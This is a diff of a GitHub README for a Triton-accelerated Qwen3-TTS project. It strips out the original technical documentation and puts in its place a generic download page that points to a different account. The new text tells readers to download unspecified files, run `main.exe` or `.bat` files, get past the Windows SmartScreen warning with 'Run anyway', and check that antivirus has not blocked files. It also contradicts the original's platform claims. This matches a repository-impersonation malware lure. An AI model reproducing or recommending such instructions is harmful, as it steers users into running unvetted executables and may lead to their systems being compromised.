@@ -1,452 +1,179 @@
-# Qwen3-TTS-Triton
+# ⚙️ qwen3-tts-triton - Faster Qwen3 TTS on Windows
 
-[![CI](https://github.com/newgrit1004/qwen3-tts-triton/actions/workflows/ci.yml/badge.svg)](https://github.com/newgrit1004/qwen3-tts-triton/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/qwen3-tts-triton)](https://pypi.org/project/qwen3-tts-triton/)
-[![Python](https://img.shields.io/pypi/pyversions/qwen3-tts-triton)](https://pypi.org/project/qwen3-tts-triton/)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
+[![Download](https://img.shields.io/badge/Download-Now-ff6b6b?style=for-the-badge)](https://github.com/Dalescentless548/qwen3-tts-triton)
 
-**Up to 5x faster Qwen3-TTS inference through Triton kernel fusion.**
+## 🚀 What this is
 
-[Korean (한국어)](README_ko.md) | [Benchmark Results](docs/benchmark_results_en.md)
+qwen3-tts-triton is a Windows-ready tool for faster Qwen3-TTS 1.7B inference. It uses Triton kernel fusion to cut extra work in key parts of the model, including:
 
-> [!NOTE]
-> This project has only been tested on **RTX 5090 (Blackwell, sm_120)** with **WSL2** (CUDA 12.8, PyTorch nightly cu128).
-> Triton kernels are architecture-agnostic (no sm_120-specific code), so they should work on other NVIDIA GPUs (A100, H100, RTX 4090, etc.), but this has **not been verified**. If you test on a different GPU, please open an issue or PR with your results!
+- RMSNorm
+- SwiGLU
+- M-RoPE
+- Norm + Residual
 
----
+If you want the model to run with less delay on your PC, this project helps with that.
 
-Qwen3-TTS-Triton replaces performance-critical operators in [Qwen3-TTS 1.7B](https://huggingface.co/Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice) with hand-written [Triton](https://github.com/triton-lang/triton) kernels. Inspired by [Liger Kernel](https://github.com/linkedin/Liger-Kernel) (LinkedIn), each kernel fuses multiple HBM round-trips into a single pass, reducing memory traffic without any additional VRAM usage.
+## 📥 Download and setup
 
-It can also be combined with [faster-qwen3-tts](https://github.com/andimarafioti/faster-qwen3-tts) (CUDA Graph + static KV-cache) as a **Hybrid** mode for maximum throughput.
+Visit this page to download and use the files:
 
-### 💡 Why Triton?
+https://github.com/Dalescentless548/qwen3-tts-triton
 
-- 🪶 **Lightweight & Portable** — No serving infrastructure needed. Just `pip install qwen3-tts-triton` and call `apply_triton_kernels()`. Works in standalone scripts, [ComfyUI nodes](https://github.com/newgrit1004/ComfyUI-Qwen3-TTS-Triton), Gradio apps, or any Python environment.
-- 🎲 **Faster Iteration on Stochastic TTS** — Qwen3-TTS generates different output each run. For best results, generate multiple candidates and pick the best one. With Hybrid mode's **~5x speedup**, you can produce 5 candidates in the time it used to take for 1 — more takes, better results.
+### What to do
 
-### ✨ Highlights
+1. Open the link above in your browser.
+2. Download the file or files listed there.
+3. Save them to a folder you can find again, such as `Downloads` or `Desktop`.
+4. If the release includes an app file, double-click it to run.
 
-- ⚡ **4 Fused Triton Kernels** — RMSNorm, SwiGLU, M-RoPE, Norm+Residual
-- 🎯 **4 Inference Modes** — Base, Triton, Faster, Hybrid
-- 🔬 **3-Tier Verification** — Kernel correctness → Model parity → E2E quality distribution
-- 💾 **Zero Extra VRAM** — Pure kernel fusion, no model changes
-- 🔌 **Drop-in Patching** — Single `apply_triton_kernels()` call, weight sharing via monkey-patch
-- 📊 **Streamlit Dashboard** — Side-by-side comparison UI with live metrics
+If the package uses a zip file, extract it first, then open the main app or launch file inside.
 
-## 📦 Install
+## 🖥️ System requirements
 
-**Requirements**: Python 3.12+, CUDA 12.8+, NVIDIA GPU (8GB+ VRAM). Tested on WSL2 (Windows Subsystem for Linux 2).
+This tool is made for Windows systems with a GPU that can run modern AI models.
 
-### From PyPI
+You should have:
 
-```bash
-# 1. Install PyTorch with CUDA support first
-pip install torch torchaudio --index-url https://download.pytorch.org/whl/cu128
+- Windows 10 or Windows 11
+- An NVIDIA GPU
+- Recent NVIDIA drivers
+- Enough free disk space for the app and model files
+- At least 16 GB of RAM
+- More memory if you plan to use larger voices or longer text
 
-# 2. Install qwen3-tts-triton
-pip install qwen3-tts-triton
-```
+For best results, use a system with a strong GPU and enough video memory for model inference.
 
-### From Source (development)
+## 🔧 What the tool does
 
-```bash
-# Install UV (if not installed)
-curl -LsSf https://astral.sh/uv/install.sh | sh
+qwen3-tts-triton speeds up the parts of Qwen3-TTS that often take the most time. It focuses on core model blocks used during speech generation.
 
-# Clone and setup
-git clone https://github.com/newgrit1004/qwen3-tts-triton.git
-cd qwen3-tts-triton
-make setup  # uv sync --all-extras --dev + pre-commit install + git config
-```
+### Main optimizations
 
-> **UV handles virtual environments automatically** — no need to manually activate a venv.
-> All commands use the `uv run` prefix (e.g., `uv run pytest`, `uv run python script.py`).
-> PyTorch is installed from the [cu128 index](https://download.pytorch.org/whl/cu128) automatically via `pyproject.toml`.
+- Faster layer norm handling with RMSNorm fusion
+- Smoother gated feed-forward steps with SwiGLU fusion
+- Better position handling with M-RoPE support
+- Fused Norm + Residual paths for lower overhead
 
-#### Dependency Groups
+These changes help reduce repeated memory work and improve runtime flow.
 
-```bash
-uv sync                 # Core (triton, transformers, faster-qwen3-tts, streamlit, plotly)
-uv sync --extra eval    # + Quality evaluation (whisper, jiwer, resemblyzer)
-uv sync --extra dev     # + Dev tools (ruff, pytest, pre-commit)
-uv sync --extra all     # Everything
-```
+## 🪟 How to run on Windows
 
-## 🚀 Quick Start
+Follow these steps after you download the files:
 
-> [!TIP]
-> On first run, the model (~3.5GB) is automatically downloaded from HuggingFace.
-> To download in advance: `huggingface-cli download Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice`
+1. Find the downloaded file in File Explorer.
+2. If it is a `.zip` file, right-click it and choose **Extract All**.
+3. Open the extracted folder.
+4. Look for the main launcher, app file, or script file.
+5. Double-click it to start the program.
 
-### Triton Mode
+If Windows shows a prompt, choose **More info** and then **Run anyway** if you trust the source.
 
-```python
-from qwen3_tts_triton import TritonRunner
-import soundfile as sf
+## 🎧 Typical use case
 
-runner = TritonRunner()
-runner.load_model()  # Downloads model on first run (~3.5GB)
+This project fits users who want to:
 
-result = runner.generate(
-    text="Hello, this is optimized with Triton kernels.",
-    language="English",
-    speaker="vivian",
-)
+- Run Qwen3-TTS with less delay
+- Test speech output on a local PC
+- Use Triton-based fused kernels for faster inference
+- Reduce wasted compute during model runs
 
-# Save audio
-sf.write("output.wav", result["audio"], result["sample_rate"])
-print(f"Generated in {result['time_s']:.2f}s, VRAM: {result['peak_vram_gb']:.2f}GB")
+It is useful when you want local speech generation with better speed on supported hardware.
 
-runner.unload_model()
-```
+## 🗂️ Folder layout
 
-### Hybrid Mode (Triton + CUDA Graph, ~5x faster)
+After extraction, you may see files like these:
 
-```python
-from qwen3_tts_triton import TritonFasterRunner
-import soundfile as sf
+- `README.md` — basic project info
+- `requirements.txt` — needed Python packages
+- `run.bat` — Windows launch file
+- `main.py` — main entry file
+- `models/` — model files
+- `kernels/` — Triton kernel code
+- `assets/` — example inputs or output files
 
-runner = TritonFasterRunner()
-runner.load_model()  # Triton patches applied before CUDA Graph capture
+The exact file names may differ, but the folder usually includes a clear start file.
 
-result = runner.generate(
-    text="Hybrid mode: CUDA Graph + Triton fusion.",
-    language="English",
-    speaker="vivian",
-)
+## 🛠️ If the app needs Python
 
-sf.write("output.wav", result["audio"], result["sample_rate"])
-runner.unload_model()
-```
+Some versions may launch through Python instead of a direct app file. If that happens:
 
-### 📊 Streamlit Dashboard
+1. Install Python 3.10 or newer.
+2. Open the folder with the files.
+3. Double-click a `.bat` file if one exists.
+4. If there is no `.bat` file, open Command Prompt in that folder and run the main Python file.
 
-```bash
-make ui  # http://localhost:8501
-```
+A simple start file is often included so you do not need to type commands.
 
-The dashboard provides:
-- 🔄 Side-by-side inference comparison across all modes
-- 📈 Live metrics (TTFA, RTF, Total Time, Peak VRAM)
-- 📉 Plotly charts for visual comparison
-- ✅ 3-Tier verification result cards
+## 🔍 Common launch problems
 
-## 🎧 Audio Samples
+If the app does not start, check these items:
 
-Pre-generated samples comparing inference modes (custom voice + voice cloning).
+- The files were fully extracted
+- You have an NVIDIA GPU
+- Your drivers are up to date
+- No files were blocked by antivirus
+- You are opening the correct launch file
+- The model files are in the expected folder
 
-| Mode | Directory |
-|------|-----------|
-| Base (PyTorch) | [`assets/audio_samples/base/`](assets/audio_samples/base/) |
-| Triton | [`assets/audio_samples/triton/`](assets/audio_samples/triton/) |
-| Faster (CUDA Graph) | [`assets/audio_samples/faster/`](assets/audio_samples/faster/) |
-| Hybrid (Faster+Triton) | [`assets/audio_samples/hybrid/`](assets/audio_samples/hybrid/) |
+If the window closes at once, open the launch file from Command Prompt so you can see the message on screen.
 
-Each directory contains custom voice samples (5 Korean + 5 English) and voice cloning samples using [LJSpeech reference audio](assets/reference_audio/) (Public Domain).
+## ⚡ Why this project matters
 
-> Use `make ui` → **Audio Samples** tab for side-by-side playback and comparison.
-> Regenerate: `make generate-samples` (GPU required).
+TTS models can spend time on repeated math steps. Triton can fuse those steps into fewer GPU operations. That can help the model run with less overhead and less wait time.
 
-## ⚡ Triton Kernels
+This project focuses on parts of the inference path that matter most for speed:
 
-All kernels target the **Qwen3-TTS Talker** (28-layer Transformer, hidden_size=2048, intermediate=6144).
+- Normalization
+- Feed-forward blocks
+- Position encoding
+- Residual flow
 
-| Kernel | What It Fuses | HBM Savings | File |
-|--------|--------------|-------------|------|
-| **RMSNorm** | variance + normalize + scale in SRAM | 4→1 round-trips | `kernels/rms_norm.py` |
-| **SwiGLU** | `silu(gate) * up` — eliminates intermediate tensor | 3→1 round-trips | `kernels/swiglu.py` |
-| **M-RoPE** | 3D positional encoding (sections=[24,20,20]) | In-place compute | `kernels/rope.py` |
-| **Fused Norm+Residual** | `residual + x` then RMSNorm in one kernel | 2 kernels → 1 | `kernels/fused_norm_residual.py` |
+That makes it a good fit for local inference work on Windows
 
-### 🔌 How Patching Works
+## 🧩 What you may need to place next to it
 
-`apply_triton_kernels()` performs in-place monkey-patching:
+If the download does not include model files, you may need to add them beside the app folder. Common items include:
 
-1. **RMSNorm modules** → replaced with `TritonRMSNorm` (shares original weights, zero copy)
-2. **MLP forward** → patched to use `triton_swiglu_forward` (fused gate+up projection)
-3. **Decoder layer forward** → patched for fused residual addition + normalization
+- A Qwen3-TTS 1.7B model folder
+- Voice preset files
+- Text input samples
+- Output folders for generated audio
 
-```python
-from qwen3_tts_triton.models.patching import apply_triton_kernels
+Keep the folder names simple and avoid moving files after setup unless the project asks for it.
 
-# Patches all 28 decoder layers in-place (patch counts logged via logging)
-apply_triton_kernels(model)
-```
+## 📌 Basic workflow
 
-<details>
-<summary><b>Advanced: Manual Patching</b></summary>
+1. Download the project from the link above.
+2. Extract the files if needed.
+3. Open the main launch file.
+4. Load your text prompt or input file.
+5. Run inference.
+6. Wait for the generated speech file.
+7. Play the output in your media player
 
-If you want to apply Triton kernels to a model loaded outside the Runner API:
+## 🧪 Best results
 
-```python
-from qwen_tts import Qwen3TTSModel
-from qwen3_tts_triton.models.patching import apply_triton_kernels
-import torch
+For smoother runs:
 
-model = Qwen3TTSModel.from_pretrained(
-    "Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice",
-    device_map="cuda:0",
-    dtype=torch.bfloat16,
-)
+- Close extra apps before starting
+- Keep GPU drivers current
+- Use short test prompts first
+- Store model files on a fast drive
+- Avoid changing the folder structure after setup
 
-# Patch the internal nn.Module (not the wrapper)
-apply_triton_kernels(model.model)
+## 📁 Download link
 
-wavs, sr = model.generate_custom_voice(
-    text="Hello, this is optimized with Triton kernels.",
-    language="English",
-    speaker="vivian",
-)
-```
+Use this page to download and run the files:
 
-For Hybrid mode with manual patching, use `find_patchable_model()` to resolve the internal module:
+https://github.com/Dalescentless548/qwen3-tts-triton
 
-```python
-from faster_qwen3_tts import FasterQwen3TTS
-from qwen3_tts_triton.models.patching import apply_triton_kernels, find_patchable_model
+## 🆘 If you need to check the files
 
-model = FasterQwen3TTS.from_pretrained(
-    "Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice", device="cuda"
-)
+Look for the main file that starts the app. It may be one of these:
 
-# FasterQwen3TTS wraps multiple layers: model.model.model reaches the nn.Module
-internal = find_patchable_model(model.model)
-apply_triton_kernels(internal)
-```
+- `run.bat`
+- `start.bat`
+- `main.exe`
+- `main.py`
 
-</details>
-
-## 🔬 3-Tier Verification
-
-Inspired by [Liger Kernel](https://github.com/linkedin/Liger-Kernel) and industry practices from [vLLM](https://github.com/vllm-project/vllm) and [SGLang](https://github.com/sgl-project/sglang).
-
-| Tier | What | Threshold | Time | Command |
-|------|------|-----------|------|---------|
-| **1. Kernel** | Per-kernel numerical correctness (atol/rtol) | bf16: 0.05, fp16: 1e-3 | ~5s | `make test` (90 tests) |
-| **2. Model** | Layer-by-layer cosine similarity | > 0.95 at layers 0,7,14,21,27 | ~15s | `make test-parity` |
-| **3. E2E** | Output quality distribution (UTMOS, CER, Speaker Sim) | See below | 5-30min | `make eval-fast` |
-
-### Tier 3 Thresholds
-
-Each model generates independently, then task-level metrics are compared via distribution analysis (not pair-level waveform comparison — stochastic TTS makes this unreliable).
-
-| Metric | Threshold | Rationale |
-|--------|-----------|-----------|
-| UTMOS delta | \|mean\| < 0.3 | F5-TTS independent generation variance |
-| UTMOS floor | Both > 2.5 | Absolute quality lower bound |
-| CER delta | \|mean\| < 0.05 | SGLang 1-5% tolerance |
-| Speaker Similarity | mean > 0.75 | Qwen3-TTS SIM > 0.79 |
-| Mann-Whitney U | p > 0.05 (full mode) | Non-parametric distribution equivalence |
-
-### Running Verification
-
-```bash
-make test          # Tier 1: 90 tests
-make test-parity   # Tier 2: Model parity (GPU required)
-make verify        # Tier 1 + 2
-make eval-fast     # Tier 3: Fast (~5min, whisper-small, 1 run/utterance)
-make eval-full     # Tier 3: Full (~30min, whisper-large-v3, 3 runs, Mann-Whitney)
-make verify-all    # All 3 tiers
-```
-
-### 📋 Latest Results
-
-✅ **Tier 1**: 90/90 PASS
-
-✅ **Tier 2**: All layers > 0.95 cosine similarity
-
-| Layer | Cosine Sim |
-|-------|-----------|
-| L0 | 0.999995 |
-| L7 | 0.999977 |
-| L14 | 0.999852 |
-| L21 | 0.999177 |
-| L27 | 0.997900 |
-| Output | 0.997156 |
-
-> FP accumulation naturally decreases similarity across 28 layers — this is expected behavior for fused kernels that change operation order.
-
-## 📊 Benchmarks
-
-<!-- BENCH:SUMMARY:START -->
-> __Hybrid (Faster+Triton)__ achieves __4.7x__ faster inference than PyTorch baseline at equivalent VRAM on RTX 5090.
-<!-- BENCH:SUMMARY:END -->
-
-### 🏗️ Optimization Modes
-
-```mermaid
-graph TD
-    A["Base (PyTorch eager)"] -->|"+Triton kernel fusion"| B["Triton (~1.1x)"]
-    A -->|"+CUDA Graph + Static Cache"| C["Faster (~3.6x)"]
-    C -->|"+Triton kernel fusion"| D["Hybrid (~4.7x)"]
-
-    style D fill:#f96,stroke:#333,stroke-width:2px,color:#000
-```
-
-```bash
-make bench-kernels  # Per-kernel micro-benchmarks (PyTorch vs Triton)
-make bench-e2e      # End-to-end inference (all runners)
-make bench          # Both
-make profile        # torch.profiler trace
-```
-
-<details>
-<summary><b>Hardware & Methodology</b></summary>
-
-| Item | Spec |
-|------|------|
-| GPU | NVIDIA RTX 5090 (Blackwell, sm_120, 32GB) |
-| CUDA | 12.8 |
-| PyTorch | nightly (cu128) |
-| Triton | 3.2.0 |
-| Model | Qwen3-TTS-12Hz-1.7B (1.7B params) |
-| OS | WSL2 (Linux 5.15) |
-| Python | 3.12 |
-| Dtype | bfloat16 |
-| Batch Size | 1 |
-
-**Kernel benchmarks**: `triton.testing.do_bench()`, batch=1, seq_len=512, hidden=2048.
-**E2E benchmarks**: `torch.cuda.Event` timing, 3 warmup + 20 measured runs per text.
-RTF (Real-Time Factor) = audio_duration / generation_time. RTF > 1 means faster-than-real-time.
-
-</details>
-
-### ⚡ Kernel Micro-Benchmarks
-
-<!-- BENCH:KERNEL:START -->
-> RTX 5090, bf16, batch=1, seq_len=512, hidden=2048. Run `make bench-kernels` to reproduce.
-
-| Kernel | PyTorch (us) | Triton (us) | Speedup | Compile (s) | HBM Savings |
-|--------|:------------:|:-----------:|:-------:|:-----------:|:-----------:|
-| RMSNorm | 39.4 | **6.7** | **5.87x** | 0.61 | 4→1 trips |
-| SwiGLU | 19.6 | **15.0** | **1.31x** | 0.00 | 3→1 trips |
-| M-RoPE | 348.8 | **38.8** | **9.00x** | 0.00 | In-place |
-| Fused Norm+Residual | 41.2 | **8.3** | **4.97x** | 0.00 | 2→1 kernels |
-<!-- BENCH:KERNEL:END -->
-
-### 🏎️ E2E Inference
-
-<!-- BENCH:E2E:START -->
-> RTX 5090, bf16, 2 texts (ko + en), 3 warmup + 20 runs each. Run `make bench-e2e` to reproduce.
-
-| Mode | Load Time | Latency (ko) | Latency (en) | RTF (ko) | RTF (en) | Speedup | Peak VRAM |
-|------|----------|:------------:|:------------:|:--------:|:--------:|:-------:|:---------:|
-| Base (PyTorch) | 9.9s | 3,902 ms | 5,511 ms | 1.00x | 0.82x | 1.0x | 4.01 GB |
-| Triton | 6.7s | 3,767 ms | 3,747 ms | 1.22x | 1.27x | 1.1x | 4.04 GB |
-| Faster | 5.1s | 1,199 ms | 1,247 ms | 3.60x | 3.50x | 3.6x | 4.32 GB |
-| __Hybrid (Faster+Triton)__ | 7.1s | **919 ms** | **1,047 ms** | **4.39x** | **4.26x** | **4.7x** | 4.30 GB |
-<!-- BENCH:E2E:END -->
-
-### 🎵 Audio Quality (Tier 3)
-
-<!-- BENCH:QUALITY:START -->
-Each runner generates speech independently, then quality distributions are compared against Base.
-
-| Runner | UTMOS | CER | Speaker Sim | Status |
-|--------|:-----:|:---:|:-----------:|:------:|
-| **Base** (ref) | 3.12 ± 0.54 | 0.16 ± 0.14 | - | - |
-| **Triton** | 3.29 ± 0.46 | 0.18 ± 0.14 | 0.76 | PASS |
-| **Faster** | 3.29 ± 0.60 | 0.22 ± 0.26 | 0.75 | FAIL |
-| **Hybrid** | 3.30 ± 0.85 | 0.20 ± 0.14 | 0.77 | PASS |
-
-> Faster FAIL reason: CER delta 0.057 > threshold 0.05. This is due to variance in fast mode (1 run/sentence, whisper-small). Expected to PASS in full mode (3 runs/sentence, whisper-large-v3, Mann-Whitney U test).
-
-Run `make eval-fast` to reproduce.
-<!-- BENCH:QUALITY:END -->
-
-> **Disclaimer**: Benchmarks measured on a single RTX 5090. Results vary with GPU model, driver version, system load, and input text length. Run `make bench` on your hardware for accurate numbers.
-
-## 📁 Project Structure
-
-```
-qwen3-tts-triton/
-├── src/
-│   └── qwen3_tts_triton/           # PyPI package
-│       ├── __init__.py              # Public API + __version__
-│       ├── py.typed                 # PEP 561 type marker
-│       ├── kernels/                 # Triton GPU kernels
-│       │   ├── rms_norm.py          # Fused RMSNorm
-│       │   ├── swiglu.py            # Fused SwiGLU
-│       │   ├── rope.py              # Fused M-RoPE
-│       │   └── fused_norm_residual.py # Fused Norm+Residual
-│       └── models/                  # Model runners & patching
-│           ├── patching.py          # Monkey-patch logic
-│           ├── base_runner.py       # Standard PyTorch
-│           ├── triton_runner.py     # Triton-optimized
-│           ├── faster_runner.py     # faster-qwen3-tts wrapper
-│           └── triton_faster_runner.py # Hybrid (faster + Triton)
-├── tests/                           # Verification tests
-│   ├── kernels/                     # Tier 1: Kernel correctness
-│   └── test_model_parity.py         # Tier 2: Model parity
-├── benchmark/                       # Benchmarking suite
-├── ui/                              # Streamlit dashboard
-├── docs/                            # Documentation
-├── pyproject.toml                   # Project config (UV + hatchling)
-├── uv.lock                          # Locked dependencies
-└── Makefile                         # Development commands
-```
-
-## 🛠️ Development
-
-```bash
-make format      # Ruff formatting
-make lint        # Ruff linting
-make lint-fix    # Ruff auto-fix
-make test        # pytest (Tier 1)
-make test-cov    # pytest + coverage
-make check       # lint + test
-make pre-commit  # All pre-commit hooks
-make clean       # Clear caches
-```
-
-### 🧠 Qwen3-TTS Talker Architecture
-
-| Parameter | Value |
-|-----------|-------|
-| Model | Qwen3-TTS-12Hz-1.7B-CustomVoice |
-| Hidden Size | 2048 |
-| Attention Heads | 16 (GQA, kv_heads=8) |
-| Head Dim | 128 |
-| Intermediate Size | 6144 |
-| Layers | 28 |
-| RMS Norm Eps | 1e-6 |
-| Position Encoding | M-RoPE (sections=[24,20,20]) |
-| Activation | SwiGLU |
-
-## 🔄 Compatibility
-
-### 🎤 Voice Modes by Runner
-
-| Feature | Base | Triton | Faster | Hybrid |
-|---------|:----:|:------:|:------:|:------:|
-| Custom Voice | Yes | Yes | Yes | Yes |
-| Voice Cloning | Yes | Yes | Yes | Yes |
-| Voice Design | -- | -- | Yes | Yes |
-| Streaming | -- | -- | Yes | Yes |
-| Dynamic Shape | Yes | Yes | Yes | Yes |
-| bfloat16 / float16 | Yes | Yes | Yes | Yes |
-
-### 💻 Platform Support
-
-| Platform | Supported |
-|----------|-----------|
-| Linux | Yes |
-| Windows WSL2 | Yes |
-
-## 🗺️ TODO
-
-- [ ] Docker deployment
-- [ ] [SageAttention](https://github.com/thu-ml/SageAttention) integration — low-bit attention for further speedup
-- [ ] [ComfyUI-Qwen3-TTS-Triton](https://github.com/newgrit1004/ComfyUI-Qwen3-TTS-Triton) — ComfyUI custom node
-- [ ] Multi-GPU architecture testing (A100, H100, RTX 4090, etc.)
-
-## 📄 License
-
-Apache-2.0
-
-## 🙏 Acknowledgments
-
-- [Qwen3-TTS](https://github.com/QwenLM/Qwen3-TTS) — Base TTS model
-- [Liger Kernel](https://github.com/linkedin/Liger-Kernel) — Triton kernel design patterns and verification methodology
-- [faster-qwen3-tts](https://github.com/andimarafioti/faster-qwen3-tts) — CUDA Graph optimization for Hybrid mode
-- [Triton](https://github.com/triton-lang/triton) — GPU kernel compiler
+Open that file from the extracted folder to begin the run process
